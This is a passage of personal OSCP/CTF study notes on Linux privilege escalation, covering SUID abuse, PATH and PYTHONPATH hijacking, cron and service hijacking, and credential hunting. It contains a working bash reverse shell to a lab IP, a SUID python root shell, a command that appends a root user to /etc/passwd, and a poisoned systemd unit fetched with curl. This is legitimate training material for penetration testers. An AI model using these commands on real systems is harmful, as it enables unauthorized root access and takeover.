<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux</h1><br/><p>[OSCP 155-163 &amp; PrivEsc book]</p><p></p><p><h1>Screenshot for Points</h1></p><p>ip -c a</p><p>hostname</p><p>whoami</p><p>cat /root/proof.txt</p><p>cat /PATH/local.txt</p><p></p><p><h1>Tips</h1></p><p>Always try low-hanging fruit 1st! For ex, <span style="color:#ff0000;">test password re-use for every Acct</span> (incl <span style="color:#ff0000;">root</span>)!</p><p><ul><li><span style="color:#33d17a;">www-data</span> can still run <strong><span style="color:#ff0000;">sudo -l</span></strong><span style="color:#ff0000;"> </span>(often/always <span style="color:#ff0000;">WITHOUT A PASSWD</span>!). May have higher/diff privs than regular users!</li></ul></p><p><ul><li>Use <span style="color:#ff0000;">common ports for R Shell payloads</span> (or ports that target is listening on)! Restrictive FW is more common on Windows, but sometimes is also there  for Linux!</li></ul></p><p><ul><li>The names used for things cat often be a hint (e.g hostname, username, etc). They could also be a misdirection, or at least unrelated.</li></ul></p><p><ul><li>The <strong><span style="color:#ff0000;">$secret</span></strong><span style="color:#ff0000;"> variable</span> used by Web Apps <span style="color:#ff0000;">may actually be a user&#39;s creds</span>! (It&#39;s supposed to be a random string, but try it anyways!)</li></ul></p><p><ul><li>For PrivEsc via RCE, a good opt is<em> chmod u+s /bin/bash</em> (allowing any user to run<em> /bin/bash -p</em>). Assigning SUID isn&#39;t stealthy but allows for easy PrivEsc should you get disconnected.</li></ul></p><p><ul><li> <span style="color:#ff0000;"> Duplicate Binaries</span>: There may be &gt;1 binary with the same name, but diff path &amp; these could&#39;ve diff privs or be a diff ver. In these cases <span style="color:#ff0000;">specify full path to correct binary</span>.</li></ul></p><p><ul><li>Try <a href="PrivEsc--Linux--Stabilize_Shell_34.html#stabilization required">stabilizing</a> even if shell already appears to be stabilized. Some <strong><span style="color:#ff0000;">errors may not appear</span></strong>, or you might get a different error, <span style="color:#ff0000;">if the shell isn&#39;t fully stabilized</span>!</li></ul></p><p><ul><li>Even if you can&#39;t SSH into an account, you may be able to locally sign-in as them with <strong>su</strong></li></ul></p><p></p><p><a name="Uber Cheese"></a><h1>Abusing SSH + pkttyagent (Uber Cheese)</h1></p><p>pkexec allows users authorized users to execute commands as another user, but a bug causes pkexec to fail in a “non-graphical environment”, so you need SSH access.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Wouldn&#39;t this also work with <strong>VNC</strong> if you don&#39;t have SSH access?</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If your user isn&#39;t in the <strong>sudo</strong> group, it may prompt for you for the password of a user who is in the <strong>sudo</strong> group. (e.g. CTF B 170)</p><p></p><p><h2>Pre-Requisites</h2><ol><li>1. <strong>1. </strong>Current user is a member of the <strong>sudo</strong> group (They need to be able to use sudo).</li></ol></p><p> </p><p>Can check with <strong>id</strong> (or by trying to use <strong>sudo -l </strong>&amp; seeing if you&#39;re allowed to run sudo on this machine).</p><p><ol><li>2. <strong>2.</strong> You need 2 SSH Shells (Or VNC?).</li></ol></p><p></p><p>Maybe could also use 1 SSH Shell &amp; a multiplexor like tmux?</p><p><ol><li>3. <strong>3. </strong>You need to know the current user&#39;s password.</li></ol></p><p></p><p><h2>Exploitation</h2></p><p>Alternate between the 1st and 2nd SSH Session for the following steps.</p><p><ol><li>1. <strong>1. {SSH 1}</strong> Get the Process ID for the 1st SSH Session by running the following.</li></ol></p><p></p><p><em>echo $$</em></p><p><ol><li>2. <strong>2.  {SSH 2}</strong> Use that PID for pkttyagent (e.g. The prev cmd showed 29643).</li></ol></p><p></p><p><em>pkttyagent -p 29643</em></p><p><ol><li>3. <strong>3.  {SSH 1}</strong> <em>pkexec /bin/bash</em></li></ol></p><p><ol><li>4. <strong>4.  {SSH 2}</strong> After running the prev cmd in the 1st SSH session, you&#39;ll get a password prompt in this session.</li></ol></p><p> </p><p>After entering the password, you&#39;ll get a root shell in the 1st SSH Session.</p><p></p><p><a name="github"></a><h1>Github Repos</h1></p><p>[CTF B 28 &amp; Wreath 132-134]</p><p></p><p>More on <a href="Recon_+_Services--WebApp_12.html#Github Public Repo">extracting info from Github Repo</a> in Web App.</p><p></p><p>There could be more than 1 <strong>.git/</strong> on a host (Could even be nested in one another)</p><p></p><p><span style="color:#ff0000;">Must be inside the directory that contains</span> the <strong>.git/</strong> directory</p><p></p><p><h2>Troubleshooting- </h2><strong><h2>fatal: detected dubious ownership in repository</h2></strong></p><p>For ex, if the repo (<strong>.git/</strong>) is inside<strong> /var/www/html</strong>, then run-</p><p></p><p><em>git config --global --add safe.directory /var/www/html</em></p><p></p><p><h2>Recon</h2></p><p>Remember to <span style="color:#ff0000;">manually check interesting files</span>. For example, <strong>settings.php</strong> may not be referenced in the following commands, but could contain creds.</p><p><ol><li>git status    (See unpublished changes)</li></ol></p><p><ol><li>git log</li></ol></p><p><ol><li>git --no-pager diff BRANCH1 BRANCH2     (Using the hashsums from git log or manually as specified below!) Must <span style="color:#ff0000;">specify commits that are only 1 change away</span> from each other (i.e can&#39;t compare commit 1 &amp; commit 5)</li></ol></p><p><ol><li>git show </li></ol></p><p></p><p><h3>Commit Hashes</h3></p><p>May have to manually list them. I believe they&#39;re in <strong>.git/objects/</strong></p><p></p><p><span class="subheading">Syntax</span>: The 1st 2 characters of the hash are the dir &amp; inside that is a file with the remanining characters. For ex,</p><p></p><p>commit <strong>c6bf001b02514f865f872996d20dc89da7b26287</strong> is in <strong>.git/objects/c6/bf001b02514f865f872996d20dc89da7b26287</strong></p><p>When referring to commits, ensure you&#39;re using the full hash! <span style="color:#ff0000;">May not be in order</span>!</p><p></p><p><h3>★</h3><h3>Grep Sensitive Info</h3></p><p>Check through site files for <span style="color:#ff0000;">known usernames</span> &amp; for the target&#39;s <span style="color:#ff0000;">email domain</span>. You can also search for other interesting keywords (e.g. &quot;password&quot;).</p><p></p><p>This may uncover credentials associated with that user &amp; / or credential re-use. Try Credential Stuffing on the Web App &amp; using other services.</p><p></p><p>If you&#39;re desperate, you can try searching for vague things (e.g. <strong>@</strong> to find other usernames / emails that you missed)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Initial recon will likely show you an email address associated with commits. You can use that email domain &amp; any you find from WebApp Enumeration. There may be <span style="color:#ff0000;">&gt;1 email domain</span> in use!</p><p></p><p><em>grep -Ri “bob” ./</em></p><p></p><p><em>grep -Ri &quot;@dog.htb&quot; ./</em></p><p></p><p><em>grep -Ri &quot;@&quot; ./</em></p><p></p><p><h3>Automated Enumeration</h3></p><p>gitleaks isn&#39;t as reliable as manual enumeration, but it may find something interesting.</p><p></p><p><em>./gitleaks git -v /dev/shm/repo</em></p><p></p><p><em>./gitleaks dir-v /dev/shm/repo</em></p><p></p><p><h1>SUID/SGID</h1></p><p><a href="https://gtfobins.github.io">GTFOBins</a> has a lot, but <span style="color:#ff0000;">DOESN&#39;T contain every exploitable binary </span>or every method of exploiting the binaries it does list.</p><p></p><p><em>find / -type f -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</em></p><p></p><p><em>find / -type f -perm -2000 -exec ls -ldb {} \; 2&gt;/dev/null</em></p><p></p><p><h2>Example Exploitation</h2></p><p>For example, the following command spawns a root shell if <strong>python</strong> has SUID permissions.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Even though it has SUID permissions, you need to change your UID to 0 (root) with <strong>os.setuid(0)</strong>. You can optionally include <strong>os.setgid(0)</strong> for full identity theft.</p><p></p><p><em>/usr/bin/python -c &quot;import os;os.setuid(0);os.setgid(0);os.system(&#39;/bin/bash -p&#39;)&quot;</em></p><p></p><p><h2>PATH Hijack</h2></p><p>[OSCP 224 &amp; CTF 32]</p><p></p><p>Can hijack the PATH to the binary itself OR any binaries that it calls (or libraries that it imports for Python, for example). </p><p></p><p><span style="color:#ff0000;">DON&#39;T need to write to the directories currently in PATH</span>, depending on the scenario &amp; type of exploit.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">Even if you don&#39;t have R/ perms</span> over the target file. There could be other ways to <span style="color:#ff0000;">intuit what it is executing</span>. For ex, if you can <span style="color:#ff0000;">trigger it &amp; watch the readout with </span><strong><span style="color:#ff0000;">pspy</span></strong> </p><p></p><p><h3>Picking Binary to Hijack</h3></p><p>Test multiple binaries that are being executed. Depending on the context, it may be more difficult (or even impossible) to exploit certain binaries, even if those binaries are invoked using a Relative PATH.</p><p></p><p>In the following example I was able to hijack <em>chpasswd</em>, but neither <em>sh</em> nor <em>echo</em> </p><p></p><p><em>sh -c echo user:pass | chpasswd </em></p><p></p><p><h3>Payloads</h3></p><p>If using R shell payload, test it on target before trying to use it for PrivEsc. That way if PrivEsc fails you&#39;ll have a better idea as to why.</p><p></p><p>Another option is<strong> chmod u+s /bin/bash</strong>, assigning SUID so you can <strong>/bin/bash -p</strong></p><p></p><p><em>echo &#39;#!/bin/bash&#39; &gt; stat</em><em></em></p><p><em>echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.45.217/1337 0&gt;&amp;1&#39; &gt;&gt; stat</em></p><p><em>cat stat</em></p><p><em>chmod 777 stat</em></p><p></p><p><h3>Create New PATH</h3></p><p><em>cd /tmp</em></p><p><em>export PATH=/tmp:$PATH</em></p><p><em>echo $PATH</em></p><p></p><p><h3>Reset PATH</h3></p><p>Reset it to default with- <em>source /etc/environment</em></p><p></p><p><h1>PYTHONPATH Hijack</h1></p><p>[PrivEsc 9, CTF B 173, etc]</p><p></p><p>Hijack a Library, or a Libray&#39;s Module for a python script that&#39;s either: executed by a job, executed with SUID/SGID set, or can be run with sudo.</p><p></p><p><h2>Setup</h2></p><p><h3>Poisoned Library</h3></p><p>It&#39;s easiest to copy legit Library file &amp; add your payload to the evil version (in the correct function if you&#39;re doing Module Hijacking).</p><p></p><p>If you need to create a new Library file or a new module in a Library file, check the target python script to see if you need to add args to the target module. For example,</p><p></p><p><strong>def evil(a,b,c)</strong></p><p></p><p><h3>Execute Permissions</h3></p><p>Give the Library file permission to execute. I&#39;ve used <strong>chmod 777</strong> in the past, but idk if you&#39;d need to also set SUID for some reason (see below)?</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: In one of my notes, I said to use <strong>chmod 4755</strong> (Owner can R/W/X, anyone can R/X &amp; sets SUID). Do you need to use SUID? Would giving the library file SUID interfere with PrivEsc?</p><p></p><p><h2>Set New PYTHONPATH for sudo</h2></p><p>You may be able to set this Env Var, causing python to check the specified directory for library files.</p><p></p><p><h3>Ability to Set Environment Variable</h3></p><p>If <strong>sudo -l</strong> contains <strong><span style="color:#ff0000;">env_keep</span></strong> shows an entry like the following, you can control this variable when the command is executed via <strong>sudo</strong>.</p><p></p><p><strong>(ALL) </strong><strong><span style="color:#ff0000;">SETENV</span></strong><strong>: NO PASSWD: /usr/bin/python3 /opt/backup.py</strong></p><p></p><p><h3>Set New Environment Variable</h3></p><p>For example, <strong>backup.py</strong> loads the <strong>pathlib</strong> library so you created the poisoned file <strong>/var/tmp/pathlib.py</strong></p><p></p><p><em>sudo PYTHONPATH=/var/tmp /usr/bin/python3 /opt/backup.py</em></p><p></p><p><h2>List Path</h2></p><p>Python also checks the <span style="color:#ff0000;">same directory that the script is located</span> in for LIBRARY.py (IIRC), &amp; this won&#39;t be shown with the below command.</p><p></p><p><em>python3 -c &quot;import sys;print(sys.path)&quot;</em></p><p></p><p><h2>Python Module Hijacking (from _ import _ )</h2></p><p>If the target python script loads in a library &amp; then invokes one of that library&#39;s functions, you need to place your payload in the target function.</p><p></p><p><h3>Example</h3></p><p>In this case, the python script <strong>cow.py</strong> uses a library in the same directory called <strong>cmd.py</strong>. The library&#39;s file extension isn&#39;t used, so it&#39;s imported as <strong>cmd</strong>.</p><p></p><p>After poisoning the library, you can run <strong>cow.py</strong> with sudo &amp; pass in the argument <strong>1</strong> to trigger this payload. </p><p></p><p><span style="color:#8ff0a4;">Python Script</span></p><p>import os</p><p>import sys</p><p><strong>from cmd import get_cmd</strong></p><p></p><p>cmd = <strong>get_command(sys.argv[1])</strong></p><p>whitelist = [&quot;ls -lah&quot;, “id”, “cat /etc/passwd”]</p><p>if cmd not in whitelist:</p><p>	print(&quot;Invalid command&quot;)</p><p>	exit()</p><p>	</p><p><span style="color:#8ff0a4;">Library</span></p><p><strong>def get_command(num):</strong></p><p>	if (num == “1”):</p><p>	return “ls -lah”</p><p>	...</p><p></p><p><span style="color:#8ff0a4;">Poisoned Library</span></p><p><strong>def get_command(num):</strong></p><p>	if (num == “1”):</p><p>	import os; os.system(&#39;R_SHELL_PAYLOAD&#39;)</p><p></p><p><h1>Wildcard Exploitation</h1></p><p>Target may be vuln if a Wildcard ( <strong>*</strong> ) is used for something like a Cron job, or in a sudo command you can run.</p><p></p><p>There are specific exploitation techniques for certain binaries, &amp; more general methods like Directory Traversal.</p><p></p><p><a name="Wildcard Dir Trav"></a><h2>Directory Traversal</h2></p><p>If there&#39;s a wildcard in the file path, you can use Dir Trav to point it anywhere on the system!</p><p></p><p>If the Wildcard is in the middle of the file path, create subdirectories as needed.</p><p></p><p><h3>Example</h3></p><p><em>sudo -l</em></p><p></p><p><strong>(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb</strong></p><p></p><p><em>echo ‘exec “/bin/sh”’ &gt; shell.rb &amp;&amp; chmod 777 shell.rb</em><em></em></p><p><em></em><em></em></p><p><em>sudo /usr/bin/ruby /root/</em><em><strong>../</strong></em><em>home/carlos/shell.rb</em></p><p></p><p><h2>Binary Specific Methods</h2></p><p>A common example is <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Tar Wildcard">tar</a>, where the Wildcard will be substituted for file names which in turn are treated as arguments for <strong>tar</strong> itself.</p><p></p><p><h1>Processes</h1></p><p>ps aux only takes a takes snapshot of the processes currently running, but this misses any dynamic processes (e.g those triggered by a cron job, etc).</p><p></p><p><h2>pspy</h2></p><p>Catches things that&#39;re missed with <em>watch -n 1 “ps aux” </em></p><p></p><p>See the <a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file#build">Github</a> for args, but often can be run w/o any. May need to <a href="Exploit_Research--Compiling_Code_32.html#go static">statically compile</a></p><p></p><p><span style="color:#060f94;">Tip</span>: <span style="color:#ff0000;">Let pspy run awhile</span>, since some procs only run intermittently (e.g wait <span style="color:#ff0000;">~5 minutes</span> or so for CTFs, but IRL procs may run far less often)</p><p></p><p><h1>Cron Jobs</h1></p><p>For a CTF, if a job isn&#39;t in a crontab file (either a <span style="color:#ff0000;">user&#39;s personal crontab</span> or the <span style="color:#ff0000;">system&#39;s</span><strong><span style="color:#ff0000;"> /etc/crontab</span></strong>), then it&#39;ll be in <strong>/etc/cron.d</strong>.</p><p></p><p>This allows the job to be run more frequently, &amp; you probably won&#39;t have to wait 1+ hours for a job in a CTF. </p><p></p><p><h2>System Cron Jobs</h2></p><p>These can typically by viewed by running-</p><p></p><p><em>ls -la /etc/cron*</em></p><p><em>cat /etc/crontab</em></p><p></p><p><h2>User Cron Jobs</h2></p><p><span style="color:#ff0000;">Every Acct (incl root) can have their own cron jobs</span> which <span style="color:#ff0000;">wouldn&#39;t appear</span> with aforementioned commands!</p><p></p><p>Typically need to be in <strong>crontab</strong> group or have elevated privs to view a user&#39;s personal crontab. The personal crontab is located in <strong>/var/spool/cron/crontabs</strong> by def.</p><p></p><p>Even if you can&#39;t directly view these jobs, can often find evidence of them (e.g in logs, notes, by capturing running processes, etc).</p><p></p><p><h3>View Current User</h3></p><p></p><p><em>crontab -l</em></p><p></p><p><h3>View Another User</h3></p><p></p><p><em>sudo crontab -u root -l</em></p><p></p><p><h2>Abusing Cron Jobs</h2></p><p>Many vectors by which scheduled jobs can be abused.</p><p></p><p><h3>File PATH Hijacking</h3></p><p>The jobs typically use a predefined PATH, so for example, hijacking Relative Paths is more difficult / unlikely than it would be for a SUID Binary.</p><p></p><p>May also be able to <span style="color:#ff0000;">hijack dependencies</span> (i.e files executed by custom scripts) or even Hijack PYTHONPATH  [PrivEsc 9]</p><p></p><p><h1>Checking Mail</h1></p><p>[CTF B 11]</p><p>Usually in<strong> /var/mail/USER</strong> or <strong>/var/spool/mail/USER</strong> but can be in other locations. The location for mail may be saved in an ENV variable, so run-</p><p></p><p><em>echo $MAIL</em></p><p></p><p><h1>Sensitive Info</h1><h1></h1></p><p><h1></h1><h2>Files</h2></p><p>Some of these files may be backed up somewhere, so even if you can&#39;t access the OG file, you may be able to access the backup!</p><p></p><p><strong>.profile</strong></p><p></p><p><strong>.bash_history</strong></p><p></p><p><strong>.bashrc</strong></p><p></p><p><strong>.ssh/</strong>			(e.g <strong>authorized_hosts</strong> can tell you which machines have signed into this target via SSH. <span style="color:#ff0000;">Private Keys may not be in this dir &amp; may have custom names</span>!)</p><p></p><p><strong>id_*	</strong>	(Priv Keys are named this by def, but can have any name.)		<em>find / -name &quot;id_*&quot; 2&gt;/dev/null</em><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>/etc/passwd</strong>	(For User Enum, or R/W perms let you add new users or modify existing user&#39;s passwords)</p><p></p><p><strong>/etc/shadow</strong> (Can attempt to crack hashes with R/ perms. R/W perms let you add new users or modify existing user&#39;s passwords)</p><p></p><p><strong>/opt/</strong></p><p></p><p><strong>/srv/</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>/var/</strong>		←  Dirs for servers like <strong>www</strong>, <strong>html</strong>, etc</p><p></p><p><strong>password.php</strong>		(Could contain creds / hashes missed by tools like Linpeas)</p><p></p><p><strong>sqlconf.php</strong>			(Creds to access DB. May also be re-used elsewhere)</p><p></p><p><strong>.htpasswd</strong> or <strong>htpasswd</strong>			(Could contain password hashes used for HTTP Basic Auth)</p><p></p><p><strong>.git/</strong>				(Local <a href="PrivEsc--Linux_29.html#github">Github Repos</a> may contain sensitive info)</p><p></p><p><h3>Web App Config Files</h3></p><p>You can check the Web App&#39;s <a href="Recon_+_Services--WebApp--Software--Apache_30.html#Configuration Files">config files</a> for things like subdomains, hashes, etc. For example,</p><p></p><p><em>find / -iname “</em><em><strong>*config*.php</strong></em><em>” 2&gt;/dev/null</em></p><p></p><p><h3>Password Managers (KeePass)</h3></p><p><span class="subheading">KeePass</span>: Look for Password Managers like <a href="Misc_Attacks--Password_Attack_5.html#KeePass">KeePass</a> (files often end in <strong>.kdbx</strong>) &amp; Firefox</p><p></p><p><em>find / -iname “</em><em><strong>*.kdbx</strong></em><em>” 2&gt;/dev/null</em></p><p></p><p><span class="subheading">Firefox</span></p><p>[CTF B 93]</p><p></p><p>Find examples with Google Dork <strong>intext:firefox_decrypt intitle:tryhackme</strong></p><p></p><p><h3>Powershell History</h3></p><p>If Linux host has <strong>pwsh</strong>, there may be Powershell history that contains sensitive info (e.g. <strong>ConsoleHost-history.txt</strong>)</p><p></p><p><a name="Writable /etc/passwd"></a><h3>Writable /etc/passwd</h3></p><p>[PrivEsc 2]</p><p>Although <strong>/etc/shadow</strong> is normally used to store hashed passwords, the system will default to using the hash provided in <strong>/etc/passwd</strong> if one is specified.</p><p></p><p>Normally, an <strong>x</strong> is listed instead to indicate that the hash is in <strong>/etc/shadow</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The hash generated by <strong>openssl passwd</strong> command will vary each time because it&#39;ll use different salts, but it doesn&#39;t matter. The password will remain the same. From StackOverFlow:</p><p></p><p>If you use openssl passwd with no options, you get the original crypt(3)-compatible hash, as described by dave_thompson_085. With it, the salt is two first letters of the hash:</p><p></p><p><em>openssl passwd &quot;a&quot;</em></p><p><strong>imM.Fa8z1RS.k</strong></p><p><em>openssl passwd -salt &quot;im&quot; &quot;a&quot;</em></p><p><strong>imM.Fa8z1RS.k</strong></p><p></p><p><span class="subheading">Generate Hash</span>: Specify the password you want to create a hash for (e.g “evil”)</p><p></p><p><em>openssl passwd evil</em></p><p></p><p><span class="subheading">Create Entry</span>: Appending the following entry will allow you to sign into this account.</p><p></p><p><em>echo &#39;hacker:iXFqtaTemqgLg:0:0:Hacker:/root:/bin/bash&#39; &gt;&gt; /etc/passwd</em><em></em></p><p><em>su hacker</em></p><p></p><p><a name="crack shadow"></a><h3>Crack /etc/shadow</h3></p><p>[OSCP 106-107]</p><p>Need either the entire files for<strong> /etc/passwd</strong> &amp; <strong>/etc/shadow</strong> or can just extract specific lines from each (lines MUST be in same order!)</p><p>Use <em>unshadow</em> &amp; list the <strong>passwd</strong> file 1st!</p><p></p><p><em>unshadow passwd_file shadow_file &gt; unshadowed.hash</em></p><p></p><p><h2>Enviroment Variables</h2></p><p>Can reveal many kinds of sensitive info, like: credentials, IP:PORT of servers it connects to, etc.</p><p></p><p><em>env 			</em>OR	<em>		 printenv</em><em></em></p><p><em>set</em>		(&quot;Lists all variables, including all local variables.&quot; WAY more info)</p><p></p><p><span class="subheading">Example Output</span>: Server connection info is especially common when dealing with containers, as multiple containers are often used to handle different tasks for compartmentalization (e.g. a Web App on 1 &amp; a Database on another). </p><p></p><p><strong>MONGO_WEB_INTERFACE=172.17.0.4:8081</strong></p><p></p><p><h2>Command History</h2></p><p>If you don&#39;t have SSH, redirect into file instead of using less.</p><p></p><p><em>history &gt; cmds.out</em><em></em></p><p><em>history | less</em></p><p></p><p><h1>Service Hijacking</h1></p><p>[CTF D 50-51]</p><p></p><p>See <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services">Hacktricks</a>.</p><p></p><p><h2>Requirements</h2></p><p><h3>Controlling Service</h3></p><p>You need 1 of the following:</p><p></p><p><span class="subheading">Writable Service File</span>: If you&#39;ve R/W for any <strong>.service </strong>file, you and modify it to trigger a payload when the service is started, restarted or stopped (or when the machine is rebooted).</p><p></p><p><span class="subheading">Writable Service Binaries</span>: If you can control any of the binaries that the<strong> .service</strong> file executes (either R/W perms or a relative PATH that you can poison), you can target that binary instead of the<strong> .service</strong> file itself.</p><p></p><p><span class="subheading">systemd PATH - Relative Paths</span>: The following command shows the PATH used by <strong>systemd</strong>. If you can write in any of the folders of the path you may be able to escalate privileges.</p><p></p><p><em>systemctl show-environment</em></p><p></p><p>You also need to search for relative paths being used on service configurations files. For example, create a malicious <strong>faraday-server</strong> binary &amp; upload it in the <strong>systemd</strong> PATH before the legit binary.</p><p></p><p><strong>ExecStart=faraday-server</strong></p><p></p><p><a name="Restarting Service"></a><h3>Restarting Service</h3></p><p>You need some way to restart the service in order to trigger your payload. There are multiple methods such as:</p><p></p><p><span class="subheading">Control over Service</span>: Privs to directly <strong>start</strong>, <strong>stop</strong>, &amp; / or <strong>restart</strong> the service is the most obvious way. You sometimes can <strong>restart</strong> it even if you can&#39;t <strong>start</strong> / <strong>stop</strong> the service, or vice versa.</p><p></p><p>If the service is not currently running, you don&#39;t need to have the permission to <strong>stop</strong> it (check with <strong>status</strong>).</p><p></p><p><em>sudo systemctl restart SERVICE</em></p><p></p><p><span class="subheading">Rebooting</span>: <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/">Rebooting</a> the machine will restart any services that automatically start at boot. In CTFs, the machines aren&#39;t usually reverted when rebooted, so your poisoned service file will be used.</p><p></p><p>You may have <strong>sudo</strong> permissions to run the <strong>reboot</strong> as root, or it may have <strong>SUID</strong> set.</p><p></p><p><em>sudo -l</em></p><p></p><p><strong>(ALL) NOPASSWD: /usr/sbin/reboot</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">IRL</span>: People will eventually restart / power off their machine even if you can&#39;t trigger it yourself. Maybe DoS to cause crash could work?</p><p></p><p><span class="subheading">Timers</span>: If you can control a<strong> .timer</strong> file, you can use the <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers">Timer</a> to trigger the service.</p><p></p><p><h2>Exploitation</h2></p><p><h3>Backup</h3></p><p>Always backup the target file before you modify it (e.g. <strong>cp</strong>). This is important for IRL Cleanup &amp; in case you break something.</p><p></p><p><h3>Poison</h3></p><p>It&#39;s often easiest to exfil the <strong>.service</strong> file &amp; modify it locally (may have issues running <strong>sed</strong> on the target).</p><p></p><p><span class="subheading">Payload</span>: Place your payload as the value of <strong>ExecStart=</strong>. Check the value of <strong>User=</strong> to verify that you can actually PrivEsc (services are often run as root). In this case, you&#39;ll get a root shell with <strong>~/bash -p</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Placing the payload in <strong>/tmp/</strong> was unreliable. It&#39;s better to use the home directory of a compromised user.</p><p></p><p><strong>[Service]</strong><strong></strong></p><p><strong>Type=simple</strong><strong></strong></p><p><strong>User=root</strong><strong></strong></p><p><strong>ExecStart=/bin/bash -c &#39;cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash&#39;</strong></p><p></p><p><span class="subheading">Uploading</span>: You can swap out the service file with the same command you&#39;re using to fetch the poisoned file from your machine.</p><p></p><p><em>curl http://10.2.11.116/svc.txt -o /etc/systemd/system/zeno-monitoring.service</em></p><p></p><p><h3>Trigger</h3></p><p>Use one of the aforementioned methods for <a href="PrivEsc--Linux_29.html#Restarting Service">restarting</a> the service.</p><p></p><p><h1>Directory Permissions &gt; File Permissions</h1></p><p>[CTF B 164]</p><p></p><p>Even if you don&#39;t have R/W perms over a file, you may have <span style="color:#ff0000;">R/W perms over a parent directory</span>!</p><p></p><p><h2>File Permission Anomaly</h2></p><p>[CTF B 173]</p><p>Even though I owned a script, &amp; had permissions to R/W, I couldn&#39;t <strong>mv</strong> or <strong>rm</strong>.</p><p></p><p>I was even able to run <strong>chmod 777 cmd.py</strong>, &amp; <strong>ls -l</strong> showed it working, but I still couldn&#39;t <strong>mv</strong> or <strong>rm</strong>.</p><p></p><p><em>ls -l</em></p><p><strong>-rw-r--r-- mat mat cmd.py</strong></p><p></p><p><h3>Workaround</h3></p><p>Create backup using <strong>cp</strong> &amp; then overwrite the file contents as follows. Not sure why this worked when other commands failed.</p><p></p><p><strong>cat &lt;&lt; EOF &gt; cmd.py</strong></p><p></p><p><h2>Use Cases</h2><ol><li>1. <strong>1. Config File</strong>: If you control the parent directory, you can create a malicious config file that the SVC will use.</li></ol></p><p><ol><li>2. <strong>2. SSH</strong>: If you control the parent directory for SSH&#39;s <strong>authorized_keys</strong>, you can create a file with that name containing your public key. This gives you SSH access as the target user who uses that SSH directory.</li></ol></p><p><ol><li>3. <strong>3. Binary Hijacking</strong>: If you control the parent directory for a binary executed by a <span style="color:#ff0000;">Cron Job</span>, <span style="color:#ff0000;">sudo</span> command, etc, you can create a malicious script to execute instead.</li></ol></p><p></p><p><h2>Exploitation</h2></p><p>Simply move the parent directory to a backup location. re-create a directory with that name, &amp; add the target file to it. You&#39;ll have full R/W perms for the newly created target file.</p><p></p><p><h3>Example</h3></p><p>The binary “bitcoin” was owned by root, &amp; I didn&#39;t have the W/ perms needed to modify it. However, I could move the parent directory to an alternate location which let me execute arbitrary binaries as root using sudo.</p><p></p><p><em>sudo -l</em></p><p></p><p><strong>(root) /home/Orka/Desktop/bitcoin</strong></p><p></p><p><em>mv ~/Desktop ~/old_Desktop</em><em></em></p><p><em></em><em></em></p><p><em>mkdir ~/Desktop</em><em></em></p><p><em></em><em></em></p><p><em>cp /bin/bash ~/Desktop/bitcoin</em><em></em></p><p><em></em><em></em></p><p><em>sudo /home/Orka/Desktop/bitcoin</em></p><p></p><p><h1>Groups</h1><h1></h1></p><p><h1></h1><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe">Hacktricks</a></p><p>Groups can be granted additional privileges in the sudoers file. This will by indicated like <strong>%</strong>GROUPNAME</p><p></p><p><h2>Custom Groups</h2></p><p><strong>id</strong> may show custom groups. The name may hint at what the purpose of the group is. Determine what <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Permissions">permissions</a> this group has. For example, check R/W/X perms for the “internal” group:</p><p></p><p><em>find / -group internal \( -perm -g+r -o -perm -g+w -o -perm -g+x \) 2&gt;/dev/null</em></p><p></p><p><h2>disk</h2><h2></h2></p><p><h2></h2>“This privilege is almost equivalent to root access as you can <span style="color:#ff0000;">access all the data inside of the machine</span>.” -<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">Hacktricks</a></p><p></p><p><h3>Find Mountpoint</h3></p><p> Find where<strong> /</strong> is mounted (or another interesting dir)</p><p></p><p><em>df -h</em></p><p></p><p><span class="subheading">Example Output</span>:</p><p>FileSystem																Size		Used		Mount</p><p><strong>/dev/mapper/ubuntu--vg-ubuntu--lv 	10G 		6G			 /</strong></p><p></p><p><h3>Access Filesystem</h3></p><p><em>debugfs</em> can be used to open an interactive prompt. If you&#39;re able to write to files, supply the <strong>-w</strong> flag.</p><p></p><p>I <span style="color:#ff0000;">don&#39;t think files can be overwritten</span>, <span style="color:#ff0000;">or directly modified</span>, but you should be <span style="color:#ff0000;">able to create new files</span> (&amp; <span style="color:#ff0000;">possibly delete old files</span>, so you can replace it with a new one).</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: Think really carefully about deleting any files, you may not be able to recover from that (especially if it&#39;s an executable file)! See below- </p><p></p><p>AFAIK you can&#39;t change file permissions via debugfs. Therefore, <span style="color:#ff0000;">files created won&#39;t have the eXecute permission</span> so you <span style="color:#ff0000;">can&#39;t hijack binaries unless they&#39;re invoked like </span><strong><span style="color:#ff0000;">bash</span></strong> ./FILE.sh or <strong><span style="color:#ff0000;">python</span></strong> ./FILE.py.</p><p></p><p><span style="color:#ff0000;">Changing SVC config files won&#39;t be useful unless you can restart the SVC</span> somehow (so it&#39;ll use the 